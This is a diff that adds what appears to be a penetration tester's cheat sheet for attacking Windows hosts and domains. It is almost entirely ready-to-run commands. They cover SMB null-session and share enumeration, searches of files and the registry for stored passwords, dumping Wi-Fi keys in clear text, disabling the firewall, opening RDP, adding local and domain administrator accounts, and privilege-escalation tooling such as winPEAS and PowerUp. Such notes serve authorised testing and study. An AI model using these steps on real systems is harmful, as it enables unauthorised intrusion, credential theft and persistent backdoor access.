@@ -1,0 +1,179 @@
+Windows
+
+
+# Anonymous users can obtain the Windows password policy
+
+msf > use auxiliary/scanner/smb/smb_enumusers 
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# CIFS NULL Session Permitted
+
+enum4linux -a <target IP>
+
+nbtscan <target IP>
+
+rpcclient -U "" <target IP>
+Enter  's password: <return>
+rpcclient $> 
+srvinfo
+enumdomusers
+queryuser <user>
+netshareenum
+netshareenumall
+querydominfo
+getdompwinfo
+
+net use \\target IP\ipc$ "" /u:""
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# CIFS Share Writeable By Everyone
+
+Places > Network > Browse Network
+
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Connect anonymously
+
+smbclient -L <target IP>                          List shares
+smbclient //<target IP>/<share>                   Connect to a share
+     dir                                          List directory contents
+     get file.txt                                 Download a file
+     more file.txt                                Read a file
+     put file.txt                                 Upload a file
+
+# Connect with credentials
+
+evil-winrm -i <target IP> -u <user> -p <password>
+smbclient //<target IP>/<share> -u <user> -p <password>
+smbmap -H <target IP> -u <user> -p <password>
+proxychains smbclient '//10.0.0.10/c$' -U 'domain.local/username%password'
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# NetBIOS and SMB
+
+smbmap -H <target IP>                             Check for access to open shares
+
+enum -G <target IP>
+enum -P <target IP>
+
+nbtenum -r <target IP>
+nbtenum -q <target IP>
+
+nbtscan -r <target range>
+nbtscan -f hosts.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Enumeration using a low level account
+
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+hostname
+whoami /user
+whoami /priv
+net users                                         Local users
+net localgroup Administrators                     Users in the Administrators Security Group
+
+ipconfig /all
+ipconfig /displaydns
+route print
+arp -a
+netstat -ano | findstr "LISTEN"
+netstat -ano | findstr "ESTABLISH
+nltest.exe /dclist:                               Show Domain Controllers
+
+schtasks /query /fo LIST /v
+tasklist /SVC                                     Links running processes to started services
+net start
+
+doskey /history                                   Show command history
+gpresult /z
+set
+net config workstation
+net user %username%
+net share
+net session
+
+dir /s *pass* == *cred* == *vnc* == *.config*
+findstr /si password *.ini *.pdf *.txt *.docx *.xlsx
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Firewall
+
+netsh firewall show state
+netsh firewall show config
+
+netsh firewall add portopening TCP 3389 RDP
+netsh firewall set opmode disable                 Disable firewall
+
+netsh wlan show interfaces
+netsh wlan show drivers
+netsh wlan show networks
+netsh wlan show profiles
+netsh wlan show profiles name="name"
+show profiles name="name" key=clear
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# User Accounts
+
+- Local
+net users                                         Local users
+net user <current user>                           Show info on a local user
+net accounts                                      Local password policy
+net config workstation
+net localgroup                                    Local Security Groups
+net localgroup Administrators                     Users in the local Administrators Security Group
+net localgroup "Remote Desktop Users"             Users in the local Remote Desktop Users Security Group
+
+net user <user> <password> /add                   Add a local user
+net localgroup Administrators <user> /add         Add new user to the Administrators Security Group
+
+net view                                          Computers in the users domain and other domains
+net view /domain                                  Computers in other domain
+
+- Domain
+net accounts /domain                              Domain password policy
+net user /domain                                  Show domain users
+net user <user> /domain                           Show info on a domain user
+net group /domain
+net group "Domain Admins" /domain                 Show domain admin   *** BREAKS remote shell
+net group "Domain Users" /domain                  Show domain users   *** BREAKS remote shell
+net group "Domain Controllers" /domain            Show domain controllers
+
+net localgroup Administrators /domain             Users in the domain Administrators Security Group
+net localgroup /domain                            Domain Security Groups
+
+net user <user> <password> /add /domain           Add a user to the domain
+net group "Domain Admins" <user> /add /domain     Add a user to a specific Security Group on the domain
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Open RDP in the firewall, start the service and login
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh firewall set opmode disable
+sc config termservice start= auto
+
+rdesktop -u <user> -p <password> <target IP>
+rdesktop -u <user> -p <password> -g 1440x900 <target IP>     Set a larger window size than the default
+rdesktop -u <user> -p <password> -g 85% <target IP>          Set a smaller window size using a percentage of the default
+rdesktop -u <user> -p <password> -g 85% -r disk:share=/root/ <target IP>
+
+ctrl + alt + enter                                Toggle full screen mode
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Privilege Escalation
+
+git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester
+cd Windows-Exploit-Suggester
+pip install xlrd --upgrade
+./windows-exploit-suggester.py --update (note the database file name)
+systeminfo > win.txt                              Run this on the Windows target and d/l to attack VM
+./windows-exploit-suggester.py --database 2020-01-18-mssb.xls --systeminfo win.txt
+
+seatbelt.exe -group=system
+
+winPEASx64.exe cmd
+
+PowerUp.ps1, Invoke-AllChecks
+SharpUp
+
